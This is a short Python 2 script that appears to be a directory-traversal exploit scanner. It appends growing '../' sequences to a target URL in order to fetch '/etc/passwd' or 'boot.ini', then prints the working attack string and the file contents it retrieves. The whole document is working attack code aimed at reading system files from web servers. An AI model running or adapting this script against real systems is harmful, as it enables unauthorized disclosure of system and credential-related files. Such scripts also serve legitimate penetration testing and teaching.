import requests
import sys

url = sys.argv[1]
payloads = {'/etc/passwd': 'root', 'boot.ini': '[boot loader]'}
up = "../"

for payload, string in payloads.iteritems():
    for i in xrange(7):
        req = requests.post(url+(i*up)+payload)
        if string in req.text:
            print("Parameter is vulnerable to Attack\r\n")
            print("Attack string: "+(i*up) +payload+"\r\n")
            print(req.text)
            break
